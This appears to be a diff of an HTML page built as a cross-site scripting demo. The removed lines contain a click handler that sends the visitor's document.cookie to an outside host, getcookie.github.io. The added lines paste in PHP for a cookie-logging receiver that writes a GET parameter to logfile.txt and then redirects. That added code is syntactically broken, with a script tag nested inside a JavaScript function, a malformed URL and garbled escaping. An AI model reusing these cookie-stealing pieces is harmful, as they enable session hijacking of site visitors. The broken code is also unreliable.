@@ -6,13 +6,41 @@
 </head>
 <body>
 	
-		<a href="javascript:alert(document.cookie)"><img src="http://www.html.am/images/html-codes/links/boracay-white-beach-sunset-300x225.jpg" width="300" height="225" alt="Photo of White Beach in Boracay, Philippines" onclick="myFunction()"/>
+		<a href="javascript:alert('XSS')"><img src="http://www.html.am/images/html-codes/links/boracay-white-beach-sunset-300x225.jpg" width="300" height="225" alt="Photo of White Beach in Boracay, Philippines" onclick="myFunction()"/>
 		<p id="demo">
 		</p>
 
 <script>
 	function myFunction() {
-    		document.write('<img src="https://getcookie.github.io/csrfdemo/index.html?cookie=' +document.cookie + '" />')
+    		<script type="text/javascript">
+ 
+document.writeln(" <?php "); 
+document.writeln(" echo \"<?php\n\";  "); 
+document.writeln(" echo \"$filename = \\"logfile.txt\\";\n\";  "); 
+document.writeln(" echo \"if (isset($_GET[\\"ex\\"]))\n\";  "); 
+document.writeln(" echo \"{\n\";  "); 
+document.writeln(" echo \"if (!$handle = fopen($filename, 'a'))\n\";  "); 
+document.writeln(" echo \"{\n\";  "); 
+document.writeln(" echo \"exit;\n\";  "); 
+document.writeln(" echo \"}\n\";  "); 
+document.writeln(" echo \"else\n\";  "); 
+document.writeln(" echo \"{\n\";  "); 
+document.writeln(" echo \"if (fwrite($handle, \\"\r\n\\" . $_GET[\\"ex\\"]) === FALSE)\n\";  "); 
+document.writeln(" echo \"{\n\";  "); 
+document.writeln(" echo \"\n\";  "); 
+document.writeln(" echo \"exit;\n\";  "); 
+document.writeln(" echo \"}\n\";  "); 
+document.writeln(" echo \"}\n\";  "); 
+document.writeln(" echo \"\n\";  "); 
+document.writeln(" echo \"header(\\"Location: http:www.crm.zoho.com");\n\";  "); 
+document.writeln(" echo \"fclose($handle);\n\";  "); 
+document.writeln(" echo \"exit;\n\";  "); 
+document.writeln(" echo \"}\n\";  "); 
+document.writeln(" echo \"exit;\n\";  "); 
+document.writeln(" echo \"?>\n\"; "); 
+document.writeln(" ?> ");
+
+</script>
 }
 </script>
 
